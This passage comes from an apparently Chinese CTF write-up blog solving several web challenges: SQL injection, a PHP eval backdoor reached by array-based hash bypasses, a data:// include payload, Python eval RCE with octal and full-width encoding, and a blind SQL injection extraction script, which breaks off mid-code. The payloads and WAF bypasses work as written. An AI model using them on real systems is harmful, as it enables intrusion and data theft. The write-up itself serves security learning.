+<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="line"><span class="cl"><span class="o">-</span><span class="mi">1</span><span class="s2">&#34;/**/union/**/select/**/1,group_concat(id,des,value)/**/from/**/`Fl4g`#
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><a class="link" href="https://www.cnblogs.com/GTL-JU/p/16054806.html"  target="_blank" rel="noopener"
+    >报错注入常用的三种注入方式(flool ,extractvalue、updatexml) - GTL_JU - 博客园</a></p>
+<h2 id="遗失的拉链"><strong>遗失的拉链</strong>
+</h2><p>直接dir扫出www.zips,得到源码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//for fun
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">])</span><span class="o">===</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">])</span><span class="o">&amp;&amp;</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;new&#39;</span><span class="p">]</span><span class="o">!==</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;star&#39;</span><span class="p">]){</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//欸 为啥sha1和md5相等呢
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/cat|flag/i&#34;</span><span class="p">,</span> <span class="nv">$cmd</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;u can not do this &#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;Wrong&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> 
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">get传：/pizwww.php?new[]=1
+</span></span><span class="line"><span class="cl">post传：star[]=2&amp;cmd=system(&#39;ls /&#39;);#system(&#39;tac /f*&#39;)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="week3">week3
+</h1><h2 id="include-me"><strong>Include Me</strong>
+</h2><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">waf</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/&lt;|\?|php|&gt;|echo|filter|flag|system|file|%|&amp;|=|`|eval/i&#34;</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;me&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;兄弟你别包&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">phpinfo</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//兄弟你知道了吗？
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;iknow&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Refresh: 5;url=https://cn.bing.com/search?q=php%E4%BC%AA%E5%8D%8F%E8%AE%AE&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">waf</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;me&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;兄弟你好香&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>直接打data伪协议，base64编码全部绕过了（有等号去掉，有waf）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">iknow</span><span class="o">=</span><span class="mi">1</span><span class="o">&amp;</span><span class="nx">me</span><span class="o">=</span><span class="nx">data</span><span class="o">://</span><span class="nx">text</span><span class="o">/</span><span class="nx">plain</span><span class="p">;</span><span class="nx">base64</span><span class="p">,</span><span class="nx">PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs</span><span class="o">/</span><span class="nx">Pg</span>  <span class="c1">#&lt;?php system(&#39;cat /flag&#39;);?&gt;
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="臭皮的计算机"><strong>臭皮的计算机</strong>
+</h2><h3 id="python代码转8进制执行rce">python代码转8进制执行rce
+</h3><p>进入calc路由，查看源码有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">flask</span> <span class="kn">import</span> <span class="n">Flask</span><span class="p">,</span> <span class="n">render_template</span><span class="p">,</span> <span class="n">request</span>  <span class="c1"># 导入Flask所需的模块</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">uuid</span>  <span class="c1"># 导入UUID模块用于生成随机密钥</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">subprocess</span>  <span class="c1"># 导入subprocess模块用于执行外部命令</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">os</span>  <span class="c1"># 导入os模块用于文件操作</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">tempfile</span>  <span class="c1"># 导入tempfile模块用于创建临时文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Flask</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>  <span class="c1"># 初始化Flask应用</span>
+</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">secret_key</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">())</span>  <span class="c1"># 设置应用的密钥</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">waf</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>  <span class="c1"># 定义一个简单的WAF函数，用于检测输入是否安全</span>
+</span></span><span class="line"><span class="cl">    <span class="n">token</span> <span class="o">=</span> <span class="kc">True</span>  <span class="c1"># 初始化token为True，表示输入安全</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">s</span><span class="p">:</span>  <span class="c1"># 遍历输入字符串的每个字符</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">i</span> <span class="ow">in</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">:</span>  <span class="c1"># 如果字符是字母</span>
+</span></span><span class="line"><span class="cl">            <span class="n">token</span> <span class="o">=</span> <span class="kc">False</span>  <span class="c1"># token设置为False，表示输入不安全</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span>  <span class="c1"># 跳出循环</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">token</span>  <span class="c1"># 返回token值，表示输入是否安全</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/&#34;</span><span class="p">)</span>  <span class="c1"># 定义处理根路径的路由</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>  <span class="c1"># 定义处理根路径的函数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;index.html&#34;</span><span class="p">)</span>  <span class="c1"># 返回index.html模板</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/calc&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">,</span> <span class="s1">&#39;GET&#39;</span><span class="p">])</span>  <span class="c1"># 定义处理/calc路径的路由，支持POST和GET方法</span>
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">calc</span><span class="p">():</span>  <span class="c1"># 定义处理/calc路径的函数</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">method</span> <span class="o">==</span> <span class="s1">&#39;POST&#39;</span><span class="p">:</span>  <span class="c1"># 如果请求方法是POST</span>
+</span></span><span class="line"><span class="cl">        <span class="n">num</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">form</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;num&#34;</span><span class="p">)</span>  <span class="c1"># 获取表单中num字段的值</span>
+</span></span><span class="line"><span class="cl">        <span class="n">script</span> <span class="o">=</span> <span class="sa">f</span><span class="s1">&#39;&#39;&#39;import os
+</span></span></span><span class="line"><span class="cl"><span class="s1">print(eval(&#34;</span><span class="si">{</span><span class="n">num</span><span class="si">}</span><span class="s1">&#34;))
+</span></span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;&#39;</span>  <span class="c1"># 构造一个Python脚本，用于执行用户输入的表达式</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">script</span><span class="p">)</span>  <span class="c1"># 打印构造的脚本（用于调试）</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">waf</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>  <span class="c1"># 如果输入通过AFW检查</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result_output</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>  <span class="c1"># 初始化结果输出为空字符串</span>
+</span></span><span class="line"><span class="cl">                <span class="k">with</span> <span class="n">tempfile</span><span class="o">.</span><span class="n">NamedTemporaryFile</span><span class="p">(</span><span class="n">mode</span><span class="o">=</span><span class="s1">&#39;w+&#39;</span><span class="p">,</span> <span class="n">suffix</span><span class="o">=</span><span class="s1">&#39;.py&#39;</span><span class="p">,</span> <span class="n">delete</span><span class="o">=</span><span class="kc">False</span><span class="p">)</span> <span class="k">as</span> <span class="n">temp_script</span><span class="p">:</span>  <span class="c1"># 创建一个临时Python文件</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">temp_script</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">script</span><span class="p">)</span>  <span class="c1"># 将构造的脚本写入临时文件</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">temp_script_path</span> <span class="o">=</span> <span class="n">temp_script</span><span class="o">.</span><span class="n">name</span>  <span class="c1"># 获取临时文件的路径</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">result</span> <span class="o">=</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">run</span><span class="p">([</span><span class="s1">&#39;python3&#39;</span><span class="p">,</span> <span class="n">temp_script_path</span><span class="p">],</span> <span class="n">capture_output</span><span class="o">=</span><span class="kc">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>  <span class="c1"># 使用subprocess执行临时文件</span>
+</span></span><span class="line"><span class="cl">                <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">temp_script_path</span><span class="p">)</span>  <span class="c1"># 删除临时文件</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="n">result_output</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="n">stdout</span> <span class="k">if</span> <span class="n">result</span><span class="o">.</span><span class="n">returncode</span> <span class="o">==</span> <span class="mi">0</span> <span class="k">else</span> <span class="n">result</span><span class="o">.</span><span class="n">stderr</span>  <span class="c1"># 根据执行结果获取输出或错误信息</span>
+</span></span><span class="line"><span class="cl">            <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>  <span class="c1"># 捕获执行过程中可能出现的异常</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result_output</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>  <span class="c1"># 将异常转换为字符串</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;calc.html&#34;</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="n">result_output</span><span class="p">)</span>  <span class="c1"># 返回calc.html模板，并传递结果</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;calc.html&#34;</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="s2">&#34;臭皮！你想干什么！！&#34;</span><span class="p">)</span>  <span class="c1"># 如果输入未通过WAF检查，返回提示信息</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s2">&#34;calc.html&#34;</span><span class="p">,</span> <span class="n">result</span><span class="o">=</span><span class="s1">&#39;试试呗&#39;</span><span class="p">)</span>  <span class="c1"># 如果请求方法是GET，返回calc.html模板和默认提示</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>  <span class="c1"># 如果脚本作为主程序</span>
+</span></span><span class="line"><span class="cl"><span class="n">运行</span>    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">30002</span><span class="p">)</span>  <span class="c1"># 启动Flask应用，监听所有主机的30002端口</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里显然不是ssti而是打python代执行，发现字母全部过滤了，那就转换为8进制</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="nb">__import__</span><span class="p">(</span><span class="s1">&#39;os&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">\<span class="mi">137</span>\<span class="mi">137</span>\<span class="mi">151</span>\<span class="mi">155</span>\<span class="mi">160</span>\<span class="mi">157</span>\<span class="mi">162</span>\<span class="mi">164</span>\<span class="mi">137</span>\<span class="mi">137</span>\<span class="mi">50</span>\<span class="mi">47</span>\<span class="mi">157</span>\<span class="mi">163</span>\<span class="mi">47</span>\<span class="mi">51</span>\<span class="mi">56</span>\<span class="mi">160</span>\<span class="mi">157</span>\<span class="mi">160</span>\<span class="mi">145</span>\<span class="mi">156</span>\<span class="mi">50</span>\<span class="mi">47</span>\<span class="mi">143</span>\<span class="mi">141</span>\<span class="mi">164</span>\<span class="mi">40</span>\<span class="mi">57</span>\<span class="mi">146</span>\<span class="mi">154</span>\<span class="mi">141</span>\<span class="mi">147</span>\<span class="mi">47</span>\<span class="mi">51</span>\<span class="mi">56</span>\<span class="mi">162</span>\<span class="mi">145</span>\<span class="mi">141</span>\<span class="mi">144</span>\<span class="mi">50</span>\<span class="mi">51</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>这里render_template只能渲染文件，由于这里已经是将结果存入文件中执行，否则就要像nctf-ez_dash一样要将结果输入文件中</p>
+<p><strong>官方wp利用全角字符+chr函数绕过</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">_＿ｉｍｐｏｒｔ_＿(ｃｈｒ(111)+ｃｈｒ(115)).ｓｙｓｔｅｍ(ｃｈｒ(99)+ｃｈｒ(97)+ｃｈｒ(116)+ｃｈｒ(32)+ｃｈｒ(47)+ｃｈｒ(102)+ｃｈｒ(108)+ｃｈｒ(97)+ｃｈｒ(103))
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="blindsql1"><strong>blindsql1</strong>
+</h2><h3 id="布尔盲注过滤空格substr">布尔盲注（过滤=，空格，/，substr）
+</h3><p>测试一下，单引号无回显，然后加上%23（#好像过滤了，&ndash;%09也许，&ndash;+由于空格被过滤不行）有回显，然后空格报错，/**/代替空格也报错，所以%09代替。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Alice&#39;%09and%09if(1&gt;0,1,0)%23	#有回显
+</span></span><span class="line"><span class="cl">Alice&#39;%09and%09if(1&gt;0,1,0)%23	#无回显
+</span></span><span class="line"><span class="cl">Alice&#39;%09and%091%09like%091%23	#打Alice&#39;%09and%091=1%23发现=被过滤，用like代替
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>手动测试一下payload，测试发现substr被过滤，用mid代替，所有payload如下（有些关键词大小写没改，从23年的newstar搬来的）</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Alice&#39;%09and%09Ord(mid((sElect%09group_concat(table_name)%09FRom%09infOrmation_schema.tables%09Where%09table_schema%09like%09database()),1,1))&gt;96%23   #发现有回显
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20250519210246057.png" alt="image-20250519210246057" style="zoom:50%;" />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&#34;http://127.0.0.1:57060/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">result</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">head</span> <span class="o">=</span> <span class="mi">32</span>
+</span></span><span class="line"><span class="cl">    <span class="n">tail</span> <span class="o">=</span> <span class="mi">127</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="n">head</span> <span class="o">&lt;</span> <span class="n">tail</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">mid</span> <span class="o">=</span> <span class="p">(</span><span class="n">head</span> <span class="o">+</span> <span class="n">tail</span><span class="p">)</span> <span class="o">//</span> <span class="mi">2</span>  <span class="c1"># 使用整数除法</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 根据需要切换payload</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;sElect%09group_concat(table_name)%09FRom%09infOrmation_schema.tables%09Where%09table_schema%09like%09database()&#34;#courses,secrets,students</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">#payload = &#34;sElect%09group_concat(column_name)%09FRom%09infOrmation_schema.columns%09Where%09table_name%09like%09&#39;secrets&#39;&#34;#id,secret_key,secret_value</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;sElect</span><span class="si">%09g</span><span class="s2">roup_concat(id,secret_key,secret_value)</span><span class="si">%09f</span><span class="s2">rom%09`secrets`&#34;</span>       <span class="c1">#这里here_is_flag要用反引号才行，单引号不行，反引号用于标识数据库、表、列等对象的名称。</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># 构造正确的URL字符串（注意去掉了末尾逗号）</span>
+</span></span><span class="line"><span class="cl">        <span class="n">current_url</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&#34;</span><span class="si">{</span><span class="n">base_url</span><span class="si">}</span><span class="s2">?student_name=Alice&#39;%09and%09Ord(mid((</span><span class="si">{</span><span class="n">payload</span><span class="si">}</span><span class="s2">),</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s2">,1))&gt;</span><span class="si">{</span><span class="n">mid</span><span class="si">}</span><span class="s2">%23&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">current_url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="s1">&#39;Alice&#39;</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">head</span> <span class="o">=</span> <span class="n">mid</span> <span class="o">+</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">tail</span> <span class="o">=</span> <span class="n">mid</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">head</span> <span class="o">!=</span> <span class="mi">32</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">result</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">head</span><span class="p">)</span>
